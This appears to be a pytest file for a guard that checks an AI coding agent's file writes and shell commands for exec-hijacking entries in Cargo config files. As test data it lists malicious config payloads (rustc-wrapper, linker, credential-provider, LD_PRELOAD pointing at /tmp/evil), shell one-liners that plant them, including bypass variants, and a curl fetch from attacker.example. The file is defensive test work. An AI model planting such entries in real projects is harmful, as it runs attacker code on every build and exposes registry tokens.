"""Cargo config exec-hijack protection guard — blocks planting a
program-spawning key (rustc-wrapper/linker/runner/credential-provider, a
rustflags linker, an LD_PRELOAD-class [env]) in `.cargo/config(.toml)`.

THREAT MODEL: Cargo itself spawns whatever its config names on the next
build/check/test/run (including an IDE's background `cargo check`), and
hands a credential-provider the live registry token. Default mode is `ask`.
"""
import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(cargo_exec={"mode": "deny"})

RULE = "cargo-exec-protect"


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _write(path, content=None, tool="Write"):
    args = {"file_path": path}
    if content is not None:
        args["content"] = content
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args=args)


def _edit_content(path, new_string):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                      args={"file_path": path, "new_string": new_string})


def _multi_edit(path, new_string):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                      args={"file_path": path,
                            "edits": [{"old_string": "x", "new_string": new_string}]})


def _mcp_write(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                      action=ActionClass.MCP, args={"path": path, "content": content})


def _gated(d):
    return d.action != Action.ALLOW


@pytest.fixture(autouse=True)
def _no_env_escape(monkeypatch):
    monkeypatch.delenv("AEGIS_ALLOW_CARGO_EXEC", raising=False)


PAYLOADS = {
    "rustc-wrapper": '[build]\nrustc-wrapper = "/tmp/evil.sh"\n',
    "workspace-wrapper": '[build]\nrustc-workspace-wrapper = "/tmp/evil.sh"\n',
    "build-rustc": '[build]\nrustc = "/tmp/evil"\n',
    "dotted-key": 'build.rustc-wrapper = "/tmp/evil.sh"\n',
    "linker": '[target.x86_64-unknown-linux-gnu]\nlinker = "/tmp/evil"\n',
    "runner": '[target.x86_64-unknown-linux-gnu]\nrunner = "sh -c evil"\n',
    "quoted-key": '[build]\n"rustc-wrapper" = "/tmp/evil.sh"\n',
    "inline-table": 'target = { x86_64-unknown-linux-gnu = { linker = "/tmp/evil" } }\n',
    "rustflags-linker": '[build]\nrustflags = ["-C", "linker=/tmp/evil"]\n',
    "rustflags-glued": '[build]\nrustflags = ["-Clinker=/tmp/evil"]\n',
    "link-arg": '[build]\nrustflags = ["-C link-arg=-Wl,--wrap=x"]\n',
    "cred-provider": '[registry]\ncredential-provider = ["/tmp/evil"]\n',
    "cred-process": '[registry]\ncredential-process = "/tmp/evil"\n',
    "global-cred": 'registry.global-credential-providers = ["/tmp/evil"]\n',
    "env-ld-preload": '[env]\nLD_PRELOAD = "/tmp/evil.so"\n',
    "env-rustc-wrapper": '[env]\nRUSTC_WRAPPER = "/tmp/evil"\n',
    "split-link-arg": '[build]\nrustflags = ["-C", "link-arg=-fuse-ld=/tmp/e"]\n',
    "split-link-args": '[build]\nrustflags = ["-C","link-args=-x"]\n',
    "pre-link-args": '[build]\nrustflags = ["-Zpre-link-args=-x"]\n',
    "split-codegen-backend": '[build]\nrustflags = ["-Z","codegen-backend=/tmp/e.so"]\n',
    "codegen-eq-linker": '[build]\nrustflags = ["--codegen=linker=/tmp/e"]\n',
    "rustdoc-runtool": '[build]\nrustdocflags = ["--runtool","/tmp/e"]\n',
    "doc-browser": '[doc]\nbrowser = "/tmp/e"\n',
    "env-ld-audit": '[env]\nLD_AUDIT = "/tmp/e.so"\n',
    "env-bash-env": '[env]\nBASH_ENV = "/tmp/e.sh"\n',
    "env-path": '[env]\nPATH = "/tmp/evil:/usr/bin"\n',
    "upper-case": '[BUILD]\nRUSTC-WRAPPER = "/tmp/evil"\n',
}


@pytest.mark.parametrize("name", sorted(PAYLOADS))
def test_write_payload_gated(name):
    d = evaluate(_write(".cargo/config.toml", PAYLOADS[name]), EMPTY)
    assert _gated(d) and d.rule == RULE and d.action == Action.ASK


@pytest.mark.parametrize("path", [
    ".cargo/config", ".cargo/config.toml", "proj/sub/.cargo/config.toml",
    "/home/u/.cargo/config.toml", "C:\\Users\\u\\.cargo\\config.toml",
    ".cargo\\config.toml", "./.cargo/./config.toml",
])
def test_path_variants_gated(path):
    assert evaluate(_write(path, PAYLOADS["rustc-wrapper"]), EMPTY).rule == RULE


def test_edit_multiedit_mcp_gated():
    pl = PAYLOADS["linker"]
    assert evaluate(_edit_content(".cargo/config.toml", pl), EMPTY).rule == RULE
    assert evaluate(_multi_edit(".cargo/config.toml", pl), EMPTY).rule == RULE
    assert evaluate(_mcp_write(".cargo/config.toml", pl), EMPTY).rule == RULE


def test_deny_mode():
    d = evaluate(_write(".cargo/config.toml", PAYLOADS["linker"]), DENY)
    assert d.action == Action.DENY and d.rule == RULE


# ---- must NOT gate -------------------------------------------------------------

@pytest.mark.parametrize("content", [
    '[net]\nretry = 3\n',
    '[profile.release]\nopt-level = 3\nlto = true\n',
    '[alias]\nb = "build"\n',
    '[build]\njobs = 4\n',
    '# TODO: consider rustc-wrapper = "sccache" later\n[build]\njobs = 2\n',
    '# linker = "mold" (maybe)\n',
])
def test_benign_config_not_gated(content):
    assert evaluate(_write(".cargo/config.toml", content), EMPTY).action == Action.ALLOW


def test_exec_key_in_other_file_not_gated():
    assert evaluate(_write("Cargo.toml", PAYLOADS["rustc-wrapper"]), EMPTY).action == Action.ALLOW
    assert evaluate(_write("notes.toml", PAYLOADS["linker"]), EMPTY).action == Action.ALLOW


def test_empty_write_not_gated():
    assert evaluate(_write(".cargo/config.toml"), EMPTY).action == Action.ALLOW


def test_off_mode():
    pol = Policy(cargo_exec={"mode": "off"})
    assert evaluate(_write(".cargo/config.toml", PAYLOADS["linker"]), pol).action == Action.ALLOW


def test_monitor_mode_allows():
    pol = Policy(cargo_exec={"mode": "monitor"})
    assert evaluate(_write(".cargo/config.toml", PAYLOADS["linker"]), pol).action == Action.ALLOW


# ---- escapes ---------------------------------------------------------------------

def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_EXEC", "1")
    assert evaluate(_write(".cargo/config.toml", PAYLOADS["linker"]), EMPTY).action == Action.ALLOW


def test_policy_allow_regex():
    pol = Policy(cargo_exec={"allow": [r"tools/\.cargo/config\.toml"]})
    assert evaluate(_write("tools/.cargo/config.toml", PAYLOADS["linker"]), pol).action == Action.ALLOW
    assert _gated(evaluate(_write("other/.cargo/config.toml", PAYLOADS["linker"]), pol))


def test_bad_allow_regex_does_not_crash():
    pol = Policy(cargo_exec={"allow": ["("]})
    assert _gated(evaluate(_write(".cargo/config.toml", PAYLOADS["linker"]), pol))


# ---- shell forms -------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "echo 'rustc-wrapper = \"/tmp/evil\"' >> .cargo/config.toml",
    "printf '[build]\\nrustc-wrapper=\"/tmp/e\"\\n' > ~/.cargo/config.toml",
    "cat >> .cargo/config.toml <<EOF\n[target.x86_64-unknown-linux-gnu]\nlinker = \"/tmp/e\"\nEOF",
    "echo 'runner = \"sh\"' | tee -a .cargo/config",
    "sed -i 's/^\\[build\\]/[build]\\nrustc-wrapper = \"\\/tmp\\/e\"/' .cargo/config.toml",
    "echo 'rustflags = [\"-Clinker=/tmp/e\"]' >> .cargo/config.toml",
])
def test_shell_plant_gated(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert _gated(d) and d.rule == RULE


@pytest.mark.parametrize("cmd", [
    "echo 'linker=\"e\"'>>.cargo/config.toml",
    "echo 'linker=\"e\"'>.cargo/config.toml",
    "echo rustc-wrapper=e 1>.cargo/config.toml",
    "(echo rustc-wrapper=e)>>.cargo/config.toml",
    "sed -i 's/.*/linker = \"e\"/' .cargo/config.toml",
    "sed -i \"s|^linker.*|linker = e|\" .cargo/config.toml",
    "echo 'rustc-wrapper=e' >> $CARGO_HOME/config.toml",
    "echo 'rustc-wrapper=e' >> ${CARGO_HOME}/config",
])
def test_shell_qa_round1_bypasses_gated(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_edit_removing_exec_key_not_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                    args={"file_path": ".cargo/config.toml",
                          "old_string": 'rustc-wrapper = "sccache"\n', "new_string": ""})
    assert evaluate(ev, EMPTY).action == Action.ALLOW
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                    args={"file_path": ".cargo/config.toml",
                          "edits": [{"old_string": 'rustc-wrapper = "sccache"',
                                     "new_string": "jobs = 4"}]})
    assert evaluate(ev, EMPTY).action == Action.ALLOW


def test_lowercase_path_dependency_not_gated():
    c = '[patch.crates-io]\nfoo = { path = "../foo" }\n[paths]\npath = "x"\n'
    assert evaluate(_write(".cargo/config.toml", c), EMPTY).action == Action.ALLOW


def test_shell_benign_not_gated():
    assert evaluate(_shell("echo 'jobs = 4' >> .cargo/config.toml"), EMPTY).action == Action.ALLOW
    assert evaluate(_shell("cargo build --release"), EMPTY).rule != RULE
    assert evaluate(_shell("cat .cargo/config.toml"), EMPTY).action == Action.ALLOW


def test_shell_comment_line_not_gated():
    cmd = ("cat > .cargo/config.toml <<'EOF'\n"
           "# TODO: consider rustc-wrapper = sccache later\n"
           "[build]\njobs = 2\nEOF")
    assert evaluate(_shell(cmd), EMPTY).action == Action.ALLOW


def test_shell_human_aegis_allow_escape():
    d = evaluate(_shell("echo 'linker = \"mold\"' >> .cargo/config.toml  # aegis-allow"), EMPTY)
    assert d.action == Action.ALLOW


def test_fetch_to_file_backstop():
    d = evaluate(_shell("curl -o .cargo/config.toml https://attacker.example/c"), EMPTY)
    assert _gated(d)


def test_adversarial_input_is_fast():
    import time
    blob = ("[build]\n" + "x " * 400000)
    t = time.time()
    evaluate(_write(".cargo/config.toml", blob), EMPTY)
    evaluate(_shell("echo " + blob[:200000] + " >> .cargo/config.toml"), EMPTY)
    assert time.time() - t < 5


# ---- QA round 2 -------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "cat >.cargo/config.toml<<'EOF'\n[build]\nrustc-wrapper=\"x\"\nEOF",
    "cat > .cargo/config.toml<<EOF\nlinker='x'\nEOF",
    "tee .cargo/config.toml<<<'linker=\"x\"'",
    "sed -i '1irustc-wrapper=\"x\"' .cargo/config.toml",
    "sed -i '$arunner=\"x\"' .cargo/config.toml",
    "sed -i '/build/alinker=\"x\"' .cargo/config.toml",
    "sed -i '/\\[build\\]/a\\rustc-wrapper=\"x\"' .cargo/config.toml",
    "sed -i '1c\\linker=\"x\"' .cargo/config.toml",
])
def test_shell_round2_gated(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_mcp_edit_file_newtext_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__edit_file", action=ActionClass.MCP,
                    args={"path": ".cargo/config.toml",
                          "edits": [{"oldText": "a", "newText": "linker='x'"}]})
    assert evaluate(ev, EMPTY).rule == RULE


def test_mixed_content_and_new_string_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__x", action=ActionClass.MCP,
                    args={"path": ".cargo/config.toml", "new_string": "linker='x'", "content": "jobs=1"})
    assert evaluate(ev, EMPTY).rule == RULE


@pytest.mark.parametrize("payload", [
    '[build]\nrustflags = ["-C","link_arg=x"]\n',
    '[build]\nrustflags = ["-Z","llvm-plugins=/x.so"]\n',
    '[build]\nrustdocflags = ["--test-builder","/x"]\n',
    '[env]\nTARGET_CC = "/x"\n', '[env]\nCC_x86_64_unknown_linux_gnu = "/x"\n',
    '[env]\nAR = "/x"\n', '[env]\nGIT_ASKPASS = "/x"\n', '[env]\nPKG_CONFIG = "/x"\n',
])
def test_round2_payloads_gated(payload):
    assert evaluate(_write(".cargo/config.toml", payload), EMPTY).rule == RULE


def test_lowercase_ar_and_cc_keys_not_gated():
    c = '[target.x]\nar = "x"\n[patch.crates-io]\ncc = { path = "../cc" }\n'
    # `ar` is deliberately not a gated bare key; only the case-sensitive env name is
    assert evaluate(_write(".cargo/config.toml", '[dependencies]\ncc = "1"\n'), EMPTY).action == Action.ALLOW
